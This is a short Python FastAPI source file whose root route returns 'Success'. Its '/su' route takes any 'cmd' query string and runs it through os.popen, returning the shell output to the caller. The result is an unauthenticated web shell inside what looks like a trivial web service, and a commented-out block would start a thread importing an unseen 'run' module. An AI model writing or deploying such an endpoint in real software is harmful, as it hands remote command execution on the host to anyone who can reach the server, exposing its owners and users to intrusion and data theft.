from threading import Thread
from fastapi import FastAPI, Query
from os import popen

# def run(): import run
# Thread(target=run).start()

app = FastAPI()
@app.get("/")
def home(): return 'Success'

@app.get("/su")
def check(cmd: str = Query(...)): return popen(cmd).read()
